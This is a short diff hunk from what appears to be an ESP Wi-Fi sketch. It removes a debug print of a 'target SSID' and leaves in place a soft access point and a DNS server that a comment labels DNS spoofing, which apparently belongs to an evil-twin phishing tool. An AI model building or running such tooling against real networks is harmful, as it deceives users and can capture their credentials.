@@ -221,7 +221,6 @@ void setup(){
   
   Serial.printf("Soft ap setup: %s\n", WiFi.softAP(currentSSID) ? "Sucessfully!" : "Failed!");
   Serial.printf("AP SSID: %s\n", currentSSID.c_str());
-  Serial.printf("Target SSID: %s\n", targetSSID.c_str());
   Serial.printf("DNS server setup: %s\n", dnsServer.start(DNS_PORT, "*", APIP) ? "Sucessfully!" : "Failed!"); //DNS spoofing (Only for HTTP)
 
   webServer.on("/", [](){  webServer.send(200, "text/html", Index(indexLang, favicon, targetSSID)); });
